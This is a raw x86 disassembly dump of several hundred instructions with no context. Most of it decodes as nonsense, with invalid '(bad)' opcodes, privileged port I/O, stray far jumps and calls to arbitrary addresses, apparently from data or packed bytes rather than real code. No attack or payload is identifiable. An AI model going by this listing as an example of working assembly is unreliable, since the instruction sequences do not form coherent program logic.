  4246ad:	mov    edx,0x49e7abc0
  4246b2:	loopne 0x424639
  4246b4:	mov    dh,0x6d
  4246b6:	mov    al,ds:0xe276d195
  4246bb:	loopne 0x42466a
  4246bd:	mov    esp,0xc0768a16
  4246c2:	(bad)  
  4246c3:	clc    
  4246c4:	dec    esi
  4246c5:	out    dx,eax
  4246c6:	push   eax
  4246c7:	cmp    DWORD PTR [ecx+0x6b],edx
  4246ca:	fsubr  DWORD PTR [eax+0x1b]
  4246cd:	fwait
  4246ce:	dec    esi
  4246cf:	sub    eax,DWORD PTR es:[ecx+0x7da5327f]
  4246d6:	mov    ah,0xe5
  4246d8:	push   esi
  4246d9:	mov    ds:0x29b12062,al
  4246de:	push   esp
  4246df:	cmc    
  4246e0:	fld    TBYTE PTR [edx+0x41]
  4246e3:	sub    eax,0x4f31254c
  4246e8:	pop    esi
  4246e9:	xchg   edx,eax
  4246ea:	lea    ecx,[ebp-0x2831923a]
  4246f0:	push   0x4d
  4246f2:	test   al,0x1e
  4246f4:	jmp    0x42475c
  4246f6:	mov    dh,0xed
  4246f8:	test   ch,0x39
  4246fb:	push   0x5a
  4246fd:	mov    ds,WORD PTR [eax-0x45e8040b]
  424703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424704:	jno    0x424740
  424706:	loopne 0x42474e
  424708:	(bad)  ds:0x276ff8d4
  42470e:	jmp    0x62a1e740
  424713:	fist   DWORD PTR [esi]
  424715:	xor    DWORD PTR [ecx],eax
  424717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424718:	push   edx
  424719:	fisubr DWORD PTR [eax]
  42471b:	call   0xca427e84
  424720:	push   ebx
  424721:	ins    BYTE PTR es:[edi],dx
  424722:	test   al,0x2e
  424724:	enterw 0x86bc,0x3e
  424729:	retf   0xb685
  42472c:	aam    0x42
  42472e:	xor    BYTE PTR [esi-0xe],dh
  424731:	mov    bh,BYTE PTR ds:0xb6d3086
  424737:	sbb    eax,0xdca64c11
  42473c:	inc    edi
  42473d:	xlat   BYTE PTR ds:[ebx]
  42473e:	dec    edx
  42473f:	mov    al,0x6d
  424741:	(bad)  [esi+0x59144c05]
  424747:	mov    eax,ds:0x2c427de1
  42474c:	mov    ecx,0xb6e0286c
  424751:	mov    esi,0x604c805d
  424756:	iret   
  424757:	in     eax,0xc3
  424759:	sub    edx,DWORD PTR [eax]
  42475b:	pop    ebp
  42475c:	add    BYTE PTR [ecx],cl
  42475e:	popf   
  42475f:	mov    dl,0x50
  424761:	or     BYTE PTR [edi],al
  424763:	shr    DWORD PTR [ebp+0x43],1
  424766:	into   
  424767:	sbb    bl,BYTE PTR [ebp+eax*8-0x77]
  42476b:	fdiv   DWORD PTR [esi+0x5c6cd40d]
  424771:	lea    ecx,[ebx]
  424773:	and    al,0x23
  424775:	fdiv   DWORD PTR [esi+0x3eb26d1b]
  42477b:	mov    ds:0x79d4fd7c,al
  424780:	(bad)  [eax]
  424782:	(bad)  
  424783:	inc    ecx
  424784:	in     al,dx
  424785:	mov    dl,BYTE PTR [edx-0x1d4e7359]
  42478b:	sub    al,0x6c
  42478d:	ins    DWORD PTR es:[edi],dx
  42478e:	in     eax,dx
  42478f:	(bad)  
  424790:	fstp   QWORD PTR [eax]
  424792:	jmp    0xe4e6e5d8
  424797:	ins    DWORD PTR es:[edi],dx
  424798:	dec    ebx
  424799:	pop    ebx
  42479a:	mov    ebx,0x38312db0
  42479f:	dec    ebp
  4247a0:	sub    al,0x88
  4247a2:	std    
  4247a3:	or     al,0x65
  4247a5:	mov    edi,0x8023b0ba
  4247aa:	pop    ebx
  4247ab:	sub    ecx,DWORD PTR [eax+0x35]
  4247ae:	int    0xd4
  4247b0:	pop    edx
  4247b1:	push   edx
  4247b2:	inc    ebp
  4247b3:	fist   DWORD PTR [ebx+edx*8]
  4247b6:	jmp    0xa236:0xb613efc5
  4247bd:	mov    dh,0x26
  4247bf:	inc    edi
  4247c0:	pop    ecx
  4247c1:	adc    BYTE PTR [edi+0x4016d0e1],ch
  4247c7:	fistp  DWORD PTR [edi-0x79]
  4247ca:	out    dx,eax
  4247cb:	rol    DWORD PTR [edx+0x575b89ed],cl
  4247d1:	and    eax,0xf861173b
  4247d6:	sar    BYTE PTR [ecx],1
  4247d8:	fwait
  4247d9:	push   0x9
  4247db:	fdiv   DWORD PTR [esi+0x1dee0554]
  4247e1:	adc    dh,ah
  4247e3:	repnz mov bh,0x2
  4247e6:	mov    bh,0x8e
  4247e8:	popa   
  4247e9:	lods   eax,DWORD PTR ds:[esi]
  4247ea:	push   ebx
  4247eb:	xor    edx,eax
  4247ed:	int3   
  4247ee:	bound  edi,QWORD PTR [eax+0x342dbb80]
  4247f4:	push   ebp
  4247f5:	dec    ebx
  4247f6:	test   al,0xaf
  4247f8:	mov    ss,esp
  4247fa:	(bad)  
  4247fb:	(bad)  
  4247fc:	adc    DWORD PTR [ecx-0x25],0xffffffc6
  424800:	inc    esi
  424801:	inc    ecx
  424803:	ss push ebx
  424805:	adc    al,0xda
  424807:	popa   
  424808:	sub    DWORD PTR [esi],ebx
  42480a:	sub    eax,0xdcb86f85
  42480f:	into   
  424810:	mov    al,ds:0x6082db5b
  424815:	not    BYTE PTR [edx+0x79f2293b]
  42481b:	adc    eax,0x948785aa
  424820:	jg     0x4247dd
  424822:	test   eax,0x5b614193
  424827:	mov    al,ds:0x758d1700
  42482c:	xchg   ebp,eax
  42482d:	cwde   
  42482e:	test   DWORD PTR [edi+0x21616dc2],esi
  424834:	pop    esi
  424835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424836:	das    
  424837:	dec    esp
  424838:	fbstp  TBYTE PTR [edi+edx*1]
  42483b:	inc    ebp
  42483c:	cld    
  42483d:	pop    ebp
  42483e:	inc    ecx
  42483f:	mov    bh,0x5a
  424841:	jo     0x4248a4
  424843:	pushf  
  424844:	arpl   WORD PTR [eax+0x34],si
  424847:	pop    ss
  424848:	les    eax,FWORD PTR [esi]
  42484a:	or     BYTE PTR [esi],0x98
  42484d:	retf   
  42484e:	jp     0x4248bf
  424850:	fcmovnb st,st(6)
  424852:	mov    BYTE PTR [edx+0x32],0x19
  424856:	call   0xac356bb2
  42485b:	mov    eax,ds:0xeb76b70b
  424860:	or     al,0x1f
  424863:	cmp    DWORD PTR [edx+0x44a789b9],edx
  424869:	and    BYTE PTR [edx-0x2c],bl
  42486c:	cs jne 0x4248bf
  42486f:	mov    esp,0xe27077fc
  424874:	mov    al,0x3
  424876:	mov    cl,0x6d
  424878:	or     ebx,DWORD PTR [edi+0x6c]
  42487b:	pop    ss
  42487c:	call   0x7add:0xad6d2a86
  424883:	pusha  
  424884:	push   ss
  424885:	pushf  
  424886:	lea    ecx,[ecx+ebp*4+0x77]
  42488a:	dec    esi
  42488b:	sub    DWORD PTR [ebx+edx*2-0x1c3d7240],edi
  424892:	inc    esp
  424893:	sub    al,BYTE PTR cs:[eax-0xe]
  424897:	les    ebp,FWORD PTR [esi+0x6d]
  42489a:	ins    BYTE PTR es:[edi],dx
  42489b:	pop    ebx
  42489c:	(bad)  
  42489d:	and    BYTE PTR [ecx+0x26],al
  4248a0:	mov    gs:0x2e5e2eb3,al
  4248a6:	jne    0x4248b8
  4248a8:	ins    BYTE PTR es:[edi],dx
  4248a9:	mov    bl,BYTE PTR [edi-0x42]
  4248ac:	adc    al,0xa6
  4248ae:	leave  
  4248af:	ins    DWORD PTR es:[edi],dx
  4248b0:	pop    ebx
  4248b1:	fld    TBYTE PTR [esi]
  4248b3:	sub    al,0x22
  4248b5:	cmp    DWORD PTR [ebx],ecx
  4248b7:	sub    eax,0xc2cb35bc
  4248bc:	div    DWORD PTR [edi-0x4049068a]
  4248c2:	clc    
  4248c3:	fwait
  4248c4:	cmp    esi,0x0
  4248c7:	les    esi,FWORD PTR [edi-0x4434f4b3]
  4248cd:	cs mov ch,0x4b
  4248d0:	je     0x4248e2
  4248d2:	cdq    
  4248d3:	push   0xf59bf928
  4248d8:	pusha  
  4248d9:	imul   edx,DWORD PTR [eax],0xffffffb0
  4248dc:	retf   
  4248dd:	adc    ecx,DWORD PTR [esp+eax*2]
  4248e0:	cmp    ebp,DWORD PTR [edx+0x58d85d]
  4248e6:	sar    DWORD PTR [ecx],cl
  4248e8:	jmp    0x2652e603
  4248ed:	mov    dh,0xb5
  4248ef:	sbb    ecx,DWORD PTR ds:0xb6e9cb3
  4248f5:	imul   ecx,DWORD PTR [edi+ebp*4+0x5a176c35],0xffffffc5
  4248fd:	into   
  4248fe:	inc    ebp
  4248ff:	xchg   edi,eax
  424900:	(bad)  
  424901:	push   ecx
  424902:	or     BYTE PTR [ebp-0x46],cl
  424905:	stos   BYTE PTR es:[edi],al
  424906:	jbe    0x424918
  424908:	mov    al,ds:0x2331c72d
  42490d:	sub    esp,DWORD PTR [edx-0x25]
  424910:	push   ss
  424911:	fist   WORD PTR [esi-0xb]
  424914:	ds sub al,0x8
  424917:	cmp    bl,bl
  424919:	lods   eax,DWORD PTR ds:[esi]
  42491a:	and    ebp,DWORD PTR [eax-0x37]
  42491d:	push   ds
  42491e:	inc    ebx
  42491f:	sbb    eax,0x920579dd
  424924:	inc    esi
  424925:	popa   
  424926:	inc    ebx
  424927:	add    DWORD PTR [edx-0x23],ebx
  42492a:	sar    DWORD PTR [ebx-0x2e2f5ecd],1
  424930:	ret    0x61b0
  424933:	sbb    BYTE PTR [ebx-0x7a],bl
  424936:	jmp    0x42499c
  424938:	aad    0xb6
  42493a:	add    eax,0x5df62a60
  42493f:	xchg   ebp,eax
  424940:	mov    edx,0x5c034017
  424945:	xor    BYTE PTR [edx-0x773857e4],bh
  42494b:	xchg   bl,bl
  42494d:	lods   eax,DWORD PTR ds:[esi]
  42494e:	(bad)  
  42494f:	int    0x57
  424951:	mov    esp,0x4f48eacf
  424956:	push   edi
  424957:	mov    ss,ecx
  424959:	mov    bl,0xb6
  42495b:	shl    BYTE PTR [esi+0x50],1
  42495e:	repnz sbb DWORD PTR [ecx+0x6b],eax
  424962:	jg     0x42498f
  424964:	inc    ecx
  424965:	ss inc eax
  424967:	ins    BYTE PTR es:[edi],dx
  424968:	aad    0xea
  42496a:	jae    0x42497e
  42496c:	dec    ebx
  42496d:	ja     0x424919
  42496f:	lods   eax,DWORD PTR ds:[esi]
  424970:	sub    BYTE PTR [edx+eax*1-0x63],ch
  424974:	push   0xffffff96
  424976:	dec    edi
  424977:	leave  
  424978:	add    bl,BYTE PTR [edx]
  42497a:	cmp    eax,DWORD PTR [eax-0x7edfa968]
  424980:	ins    WORD PTR es:[edi],dx
  424982:	fcmovnb st,st(2)
  424984:	(bad)  
  424985:	jmp    DWORD PTR [edi-0x10f38394]
  42498b:	hlt    
  42498c:	jecxz  0x4249a1
  42498e:	and    BYTE PTR [ebp+0x51ecb170],0x3
  424995:	hlt    
  424996:	sbb    esi,edx
  424998:	jle    0x42494b
  42499a:	or     DWORD PTR [ebx-0x75157311],0xb0c5b322
  4249a4:	sub    eax,0xe2d1ed6d
  4249a9:	gs inc edi
  4249ab:	int    0x26
  4249ad:	ins    DWORD PTR es:[edi],dx
  4249ae:	add    bl,BYTE PTR [ebx]
  4249b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249b1:	fild   DWORD PTR [edx-0x45]
  4249b4:	mov    ds:0xb559f489,eax
  4249b9:	inc    ebp
  4249ba:	adc    al,0x87
  4249bc:	scas   al,BYTE PTR es:[edi]
  4249bd:	(bad)  [ebp+0x2c]
  4249c0:	xchg   esp,eax
  4249c1:	outs   dx,BYTE PTR ds:[esi]
  4249c2:	(bad)  
  4249c3:	xchg   esi,eax
  4249c4:	shl    BYTE PTR [ecx+0x70],cl
  4249c7:	pop    ebp
  4249c8:	xor    edi,DWORD PTR [esi+0x2c]
  4249cb:	fsubr  QWORD PTR [eax]
  4249cd:	push   ebp
  4249ce:	jle    0x424a06
  4249d0:	dec    esi
  4249d1:	out    dx,eax
  4249d2:	aaa    
  4249d3:	cs in  eax,dx
  4249d5:	push   edx
  4249d6:	add    edx,DWORD PTR [eax+0x1e]
  4249d9:	out    0xd7,al
  4249db:	fld    DWORD PTR [ebx]
  4249dd:	pop    ss
  4249de:	lods   eax,DWORD PTR ds:[esi]
  4249df:	cld    
  4249e0:	add    bl,BYTE PTR [ebx+0x38]
  4249e3:	pop    ebx
  4249e4:	mov    edx,0xfa00c709
  4249e9:	lahf   
  4249ea:	outs   dx,BYTE PTR ds:[esi]
  4249eb:	lea    ebp,[ebp-0x5411727b]
  4249f1:	xor    eax,0x8870807c
  4249f6:	jnp    0x424a0d
  4249f8:	test   al,0xda
  4249fa:	rcr    BYTE PTR [eax-0x7c],cl
  4249fd:	out    0x99,al
  4249ff:	mov    edi,gs
  424a01:	sub    eax,0x11b6db6d
  424a06:	adc    eax,0x59a4b8ad
  424a0b:	adc    DWORD PTR [edx+0x77],esp
  424a0e:	enter  0x8056,0x2a
  424a12:	mov    edi,0x545c74
  424a17:	cs xchg ebp,eax
  424a19:	mov    fs,WORD PTR [ebp+ebp*2+0x59c2e83b]
  424a20:	fs inc edi
  424a22:	into   
  424a23:	sub    esp,DWORD PTR [ecx+0x168b2680]
  424a29:	mov    dh,0xb6
  424a2b:	sub    eax,0xea2918fe
  424a30:	add    ch,ah
  424a32:	mov    al,ds:0x383a1fca
  424a37:	jne    0x424a14
  424a39:	xor    dl,bh
  424a3b:	and    edx,DWORD PTR [eax]
  424a3d:	pop    ds
  424a3e:	jne    0x4249c0
  424a40:	xor    eax,0xdd7c54a1
  424a45:	dec    ebp
  424a46:	div    DWORD PTR [eax-0x63]
  424a49:	mov    BYTE PTR [edi],bl
  424a4b:	add    DWORD PTR [eax-0x3d8fbf8b],edi
  424a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a52:	mov    edx,eax
  424a54:	lods   eax,DWORD PTR ds:[esi]
  424a55:	lods   eax,DWORD PTR ds:[esi]
  424a56:	in     al,0x6f
  424a58:	pop    esp
  424a59:	push   0x20
  424a5b:	mov    edx,ds
  424a5d:	pop    ss
  424a5e:	jl     0x424a9f
  424a60:	sbb    BYTE PTR [eax-0x41a5dc00],ch
  424a66:	sub    eax,0x27432294
  424a6b:	sahf   
  424a6c:	and    BYTE PTR [edi-0x2f2f7e00],bh
  424a72:	ret    0xa856
  424a75:	xor    al,0xe9
  424a77:	jecxz  0x424a98
  424a79:	and    DWORD PTR [ecx+0x63],esp
  424a7c:	mov    eax,ds:0x2fcce9d4
  424a81:	pop    es
  424a82:	inc    BYTE PTR [esi]
  424a84:	lds    esp,FWORD PTR [esi+0x76db6b77]
  424a8a:	and    eax,0x899efbd3
  424a8f:	xchg   esi,eax
  424a90:	pop    ecx
  424a91:	adc    DWORD PTR [edx-0xe],eax
  424a94:	fld    QWORD PTR [esi+0x35ed6eda]
  424a9a:	jb     0x424b04
  424a9c:	loopne 0x424a42
  424a9e:	call   FWORD PTR [eax+0x6e167f8b]
  424aa4:	pop    ebp
  424aa5:	shr    ecx,0x10
  424aa8:	fwait
  424aa9:	jb     0x424aad
  424aab:	dec    ebx
  424aac:	xchg   ecx,eax
  424aad:	aaa    
  424aae:	mov    esp,0x88ec0435
  424ab3:	and    DWORD PTR [ebp+0x2893781c],esi
  424ab9:	in     al,dx
  424aba:	sub    ch,BYTE PTR [esi+0x64]
  424abd:	sub    BYTE PTR [ecx+0x42],dl
  424ac0:	push   esp
  424ac1:	xor    DWORD PTR [edx+0xb],edx
  424ac4:	sbb    ebx,DWORD PTR [ebx-0x77]
  424ac7:	inc    ecx
  424ac8:	ds mov ch,0xb4
  424acb:	mov    edx,0xdb444804
  424ad0:	outs   dx,BYTE PTR ds:[esi]
  424ad1:	pop    ebx
  424ad2:	jo     0x424ad3
  424ad4:	mov    ecx,0x5b5f93cc
  424ad9:	dec    edx
  424ada:	fstp   TBYTE PTR [edx-0x7e]
  424add:	add    ch,BYTE PTR ds:0xc6f4eae6
  424ae3:	retf   
  424ae4:	inc    edx
  424ae5:	inc    edi
  424ae6:	aam    0x6d
  424ae8:	mov    ds:0xf51531d4,al
  424aed:	jl     0x424b50
  424aef:	mov    ebx,0x74d2dbb5
  424af4:	repnz dec edx
  424af6:	jge    0x424a9d
  424af8:	pop    edx
  424af9:	pop    ecx
  424afa:	mov    al,0x1f
  424afc:	out    dx,al
  424afd:	sahf   
  424afe:	mov    dh,0x6d
  424b00:	mov    ah,0x6d
  424b02:	cli    
  424b03:	fwait
  424b04:	lea    edi,[esi]
  424b06:	push   ds
  424b07:	cli    
  424b08:	das    
  424b09:	enter  0xe08c,0x82
  424b0d:	mov    dh,0xed
  424b0f:	scas   eax,DWORD PTR es:[edi]
  424b10:	out    0x14,al
  424b12:	xchg   edi,eax
  424b13:	inc    ecx
  424b14:	in     eax,dx
  424b15:	add    al,BYTE PTR [esi+0x63]
  424b18:	jmp    0xac439d63
  424b1d:	mov    DWORD PTR [ecx+eiz*1-0x31],esp
  424b21:	sub    DWORD PTR [edx-0x5f],0xfcedfc
  424b28:	push   0x7a4d4039
  424b2d:	mov    al,0xb5
  424b2f:	ins    DWORD PTR es:[edi],dx
  424b30:	ins    DWORD PTR es:[edi],dx
  424b31:	push   0x74ff2c83
  424b36:	in     al,dx
  424b37:	adc    BYTE PTR [eax],dl
  424b39:	sub    edi,DWORD PTR [edi]
  424b3b:	pop    eax
  424b3c:	mov    edx,0x4acba834
  424b41:	mov    ds:0x5f15986b,eax
  424b46:	xchg   esi,eax
  424b47:	push   ss
  424b48:	mov    dh,0x76
  424b4a:	adc    al,0x60
  424b4c:	fwait
  424b4d:	or     ebp,DWORD PTR [edx-0x4e9ab872]
  424b53:	ins    DWORD PTR es:[edi],dx
  424b54:	or     DWORD PTR [eax-0x5633f723],esp
  424b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b5c:	shl    ebx,0x5a
  424b5f:	aam    0x6e
  424b61:	mov    ch,0x54
  424b63:	jmp    0x6e745a14
  424b68:	aam    0xed
  424b6a:	inc    edi
  424b6b:	aaa    
  424b6c:	push   ss
  424b6d:	std    
  424b6e:	or     eax,0x6d1fbb93
  424b73:	cmp    al,0x28
  424b75:	dec    ebp
  424b76:	lea    eax,[ebp+0x34768a06]
  424b7c:	pop    es
  424b7d:	mov    dl,0x8b
  424b7f:	sub    ch,BYTE PTR [ebx+0x32b7000d]
  424b85:	enter  0xdebc,0x97
  424b89:	nop
  424b8a:	aam    0x2c
  424b8c:	shl    DWORD PTR [esi-0x75],1
  424b8f:	test   BYTE PTR [esi-0x18787fd3],0xad
  424b96:	imul   ebp,DWORD PTR [ecx-0x28],0x3a
  424b9a:	sub    dh,BYTE PTR [esi]
  424b9c:	imul   esi,DWORD PTR [edx+eax*8-0x4a52b447],0x85b44b8d
  424ba7:	aad    0x5d
  424ba9:	(bad)  
  424baa:	(bad)  
  424bab:	lods   al,BYTE PTR ds:[esi]
  424bac:	pop    ecx
  424bad:	in     al,0x7f
  424baf:	mov    eax,ds:0x2cc1802b
  424bb4:	cmp    al,0x82
  424bb6:	xor    bl,BYTE PTR [edx]
  424bb8:	add    BYTE PTR [eax+0x2b],bl
  424bbb:	add    BYTE PTR ds:0x22ca9711,bl
  424bc1:	and    dl,BYTE PTR [edi]
  424bc3:	sbb    ch,BYTE PTR [esi-0x5d]
  424bc6:	ss and eax,ebp
  424bc9:	mov    dh,0x6d
  424bcb:	mov    eax,ds:0xd4401d9f
  424bd0:	pop    ss
  424bd1:	sbb    ecx,DWORD PTR [ebp+ebp*1-0x4b]
  424bd5:	test   al,0xad
  424bd7:	(bad)  
  424bd8:	ds hlt 
  424bda:	leave  
  424bdb:	mov    dh,0x88
  424bdd:	retf   0xa2d6
  424be0:	mov    eax,0xf1dbaad4
  424be5:	xchg   edx,eax
  424be6:	lods   al,BYTE PTR ds:[esi]
  424be7:	ins    DWORD PTR es:[edi],dx
  424be8:	mov    al,0x39
  424bea:	fisttp DWORD PTR ss:[ebx]
  424bed:	jnp    0x424bfa
  424bef:	js     0x424bdd
  424bf1:	adc    DWORD PTR [eax+0x32b6ed04],esi
  424bf7:	adc    BYTE PTR [eax-0x6df76639],dh
  424bfd:	xlat   BYTE PTR ds:[ebx]
  424bfe:	dec    ebx
  424bff:	test   DWORD PTR ds:0xaf5b01b0,ecx
  424c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c06:	mov    bh,0x7f
  424c08:	(bad)  
  424c0a:	imul   ebx,ebx,0x2e
  424c0d:	ins    BYTE PTR es:[edi],dx
  424c0e:	and    BYTE PTR [eax+eax*2-0x33220390],0xe6
  424c16:	dec    edx
  424c17:	sbb    al,0xbb
  424c19:	(bad)  
  424c1a:	mov    BYTE PTR [esi-0x3d],0x6
  424c1e:	push   DWORD PTR [edx+0x5d5e082]
  424c24:	shr    BYTE PTR [ebp+0x79],cl
  424c27:	arpl   WORD PTR ds:0x46004415,ax
  424c2d:	jmp    0x6c6c:0x4ae8bf14
  424c34:	pop    ebp
  424c35:	shl    esp,1
  424c37:	rcl    DWORD PTR [eax+ecx*8+0x2cdbea24],0x5c
  424c3f:	push   0x41d6c540
  424c44:	xchg   esi,eax
  424c45:	icebp  
  424c46:	inc    ebp
  424c47:	pop    ebx
  424c48:	mov    eax,ds:0x7513b1a2
  424c4d:	sub    eax,0x2d28a47
  424c52:	test   DWORD PTR [ebx],ecx
  424c54:	xchg   ecx,eax
  424c55:	(bad)  
  424c56:	std    
  424c57:	mov    eax,0x5de6ae0c
  424c5c:	fsubr  DWORD PTR [eax-0x3c]
  424c5f:	iret   
  424c60:	sub    al,0x51
  424c62:	call   0x68ad:0x42407a61
  424c69:	sub    eax,DWORD PTR [edx]
  424c6b:	sub    dh,0x43
  424c6e:	adc    DWORD PTR [ebx+ebx*1+0x4b],ebp
  424c72:	retf   
  424c73:	cmp    al,0xc0
  424c75:	aam    0x7
  424c77:	or     DWORD PTR [ecx-0x4a45d3da],ebx
  424c7d:	sub    eax,0x152e46c
  424c82:	scas   eax,DWORD PTR es:[edi]
  424c83:	xor    eax,0x5a04e22c
  424c88:	pop    ss
  424c89:	fisubr DWORD PTR [ebp+0x3e9c9c09]
  424c8f:	stc    
  424c90:	jg     0x424c84
  424c92:	or     eax,0xbb6d8612
  424c97:	xor    eax,0x9b71b750
  424c9c:	mov    al,BYTE PTR [ebx+0x1a]
  424c9f:	jne    0x424d1b
  424ca1:	fstp   TBYTE PTR [edx+0x76d16e82]
  424ca7:	shr    DWORD PTR [edx+0x4a],cl
  424caa:	xor    DWORD PTR [ebx+0x32],0xffffffe0
  424cae:	(bad)  
  424caf:	push   esp
  424cb0:	jno    0x424cb0
  424cb2:	frstor [esi+0x55d5b364]
  424cb8:	aad    0x15
  424cba:	mov    al,0x2b
  424cbc:	fmul   DWORD PTR [ecx+ebx*8+0x60]
  424cc0:	fldcw  WORD PTR [esi-0x25]
  424cc3:	push   edx
  424cc4:	mov    ebx,0x893c5f2e
  424cc9:	mov    eax,ds:0x6e0c772b
  424cce:	xchg   BYTE PTR [ecx-0x5a],dh
  424cd1:	jmp    0x9b00:0x41f297f2
  424cd8:	adc    DWORD PTR [eax],eax
  424cda:	addr16 xchg ecx,eax
  424cdc:	stos   DWORD PTR es:[edi],eax
  424cdd:	push   esp
  424cde:	pusha  
  424cdf:	mov    ebx,0x5171d075
  424ce4:	aaa    
  424ce5:	push   esp
  424ce6:	inc    esp
  424ce7:	adc    bl,BYTE PTR [esi-0x47]
  424cea:	scas   al,BYTE PTR es:[edi]
  424ceb:	adc    BYTE PTR [eax+0x6b],dh
  424cee:	or     ah,dl
  424cf0:	(bad)  
  424cf1:	dec    ebp
  424cf2:	mov    al,0x43
  424cf4:	and    BYTE PTR cs:[eax+0x75],ch
  424cf8:	pop    edx
  424cf9:	mov    edx,0xea9c3d
  424cfe:	fisubr DWORD PTR [esi+0x20]
  424d01:	push   0xfffffffe
  424d03:	pop    ss
  424d04:	cdq    
  424d05:	and    BYTE PTR [esi+0x4d],0xc5
  424d09:	ins    DWORD PTR es:[edi],dx
  424d0a:	pop    ebx
  424d0b:	cmp    al,bl
  424d0d:	cmp    BYTE PTR [ebx+0x3755d080],cl
  424d13:	les    ebp,FWORD PTR [eax]
  424d15:	adc    eax,0x36ba02e5
  424d1a:	scas   al,BYTE PTR es:[edi]
  424d1b:	rcl    DWORD PTR [ecx-0x45],cl
  424d1e:	lock pop ebp
  424d20:	jo     0x424d78
  424d22:	mov    ecx,0xb510d065
  424d27:	pushf  
  424d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d29:	jbe    0x424d40
  424d2b:	fmul   QWORD PTR [edx-0x47]
  424d2e:	mov    DWORD PTR [edi+eiz*2],ecx
  424d31:	inc    ebx
  424d32:	or     BYTE PTR [ebp-0x291f7c53],dh
  424d38:	cmp    edi,DWORD PTR [edx+0x39]
  424d3b:	mov    ebx,0xdb02deb
  424d40:	rol    dl,1
  424d42:	lea    ecx,[edi]
  424d44:	jle    0x424d6d
  424d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d47:	push   0xfffffffc
  424d49:	sbb    eax,0x512a5c44
  424d4e:	mov    ah,0xf3
  424d50:	imul   edi,DWORD PTR [eax],0x62
  424d53:	push   0x6d0b1b6b
  424d58:	adc    edi,DWORD PTR [edi-0x599d3a2a]
  424d5e:	nop
  424d5f:	cld    
  424d60:	ret    0xd6db
  424d63:	ret    0x302
  424d66:	test   BYTE PTR [ecx+0x34],0x19
  424d6a:	xchg   ebp,eax
  424d6b:	add    ah,BYTE PTR [ebx-0x24]
  424d6e:	fisubr DWORD PTR [esi]
  424d70:	stos   BYTE PTR es:[edi],al
  424d71:	cmp    eax,0xb04bcea4
  424d76:	xchg   bh,ah
  424d78:	cmp    ah,BYTE PTR [edx]
  424d7a:	pop    edx
  424d7b:	inc    eax
  424d7c:	pmulhuw mm1,mm5
  424d7f:	mov    esp,0xd0b0b822
  424d84:	icebp  
  424d85:	jl     0x424d5a
  424d87:	test   eax,0x6a5d34ac
  424d8c:	aaa    
  424d8d:	sbb    cl,BYTE PTR ds:0x60132188
  424d93:	cmp    cl,ch
  424d95:	mov    gs,WORD PTR [ecx+0x50]
  424d98:	fcmovnbe st,st(6)
  424d9a:	inc    esp
  424d9b:	fs (bad) 
  424d9d:	outs   dx,BYTE PTR ds:[esi]
  424d9e:	sbb    eax,DWORD PTR [edi+0x5f]
  424da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424da2:	lods   eax,DWORD PTR ds:[esi]
  424da3:	mov    ch,0xb0
  424da5:	ror    ebp,cl
  424da7:	int    0xc6
  424da9:	test   eax,0x4922e32
  424dae:	aad    0x96
  424db0:	mov    al,ds:0xb0267b9c
  424db5:	pop    ss
  424db6:	fimul  DWORD PTR [ebp+0x1298e3ad]
  424dbc:	adc    eax,0x7c08cbc1
  424dc1:	adc    al,0x15
  424dc3:	dec    ebx
  424dc4:	adc    DWORD PTR [ebx],ebx
  424dc6:	in     eax,0x0
  424dc8:	mov    ds:0x2d4ce4db,eax
  424dcd:	pop    ecx
  424dce:	stos   BYTE PTR es:[edi],al
  424dcf:	lods   eax,DWORD PTR ds:[esi]
  424dd0:	leave  
  424dd1:	inc    eax
  424dd2:	add    eax,0x2808105c
  424dd7:	ins    DWORD PTR es:[edi],dx
  424dd8:	sub    al,0xb4
  424dda:	sub    eax,0x5bad939b
  424ddf:	push   esp
  424de0:	or     edx,ebp
  424de2:	push   ss
  424de3:	mov    dh,0x42
  424de5:	stos   DWORD PTR es:[edi],eax
  424de6:	xor    ebp,0xffffffd9
  424de9:	retf   
  424dea:	jb     0x424dfc
  424dec:	int3   
  424ded:	pop    ebx
  424dee:	stos   DWORD PTR es:[edi],eax
  424def:	push   0xf7013117
  424df4:	cmp    bh,0xb3
  424df7:	pop    es
  424df8:	inc    esi
  424df9:	inc    ebx
  424dfa:	push   cs
  424dfb:	xor    ch,0x28
  424dfe:	sbb    DWORD PTR [edi-0x34],0x43
  424e02:	mov    al,0x8b
  424e04:	call   0xc0213fed
  424e09:	fidiv  WORD PTR ds:0x2025b768
  424e0f:	jnp    0x424e1a
  424e11:	pop    edi
  424e12:	(bad)  
  424e13:	rol    BYTE PTR ds:0xd85858a8,cl
  424e19:	xchg   DWORD PTR ds:0xb27f2c13,edi
  424e1f:	or     dl,BYTE PTR [edi-0x7a552555]
  424e25:	dec    BYTE PTR [edx+edx*2+0x53]
  424e29:	les    esp,FWORD PTR [ebp-0x3f69416f]
  424e2f:	loope  0x424dbd
  424e31:	adc    eax,0xdbdb6c2e
  424e36:	jge    0x424e2e
  424e38:	ret    0xd6a3
  424e3b:	lds    ebx,FWORD PTR [edi+0x40]
  424e3e:	mov    ah,0xc1
  424e40:	mov    dh,0x2d
  424e42:	jge    0x424e30
  424e44:	add    eax,0x8322a796
  424e49:	retf   
  424e4a:	push   eax
  424e4b:	mov    al,ds:0x4e0e35b6
  424e50:	and    BYTE PTR [edx-0x47],ah
  424e53:	fnsave [esi+ebp*2]
  424e56:	sub    eax,0x84de37b0
  424e5b:	call   0xc9d74997
  424e60:	mov    bh,0x6
  424e62:	or     BYTE PTR [esi],ch
  424e64:	(bad)  
  424e65:	or     BYTE PTR [edi+ebp*1+0x70d735bc],dl
  424e6c:	outs   dx,BYTE PTR ds:[esi]
  424e6d:	sbb    esp,ebp
  424e6f:	or     eax,DWORD PTR [edi]
  424e71:	iret   
  424e72:	add    BYTE PTR [ecx-0x3dbe90ae],dh
  424e78:	xor    al,0xa
  424e7a:	xchg   esi,eax
  424e7b:	call   0x8862:0xb59edb68
  424e82:	stc    
  424e83:	aas    
  424e84:	jecxz  0x424ea5
  424e86:	xchg   esi,eax
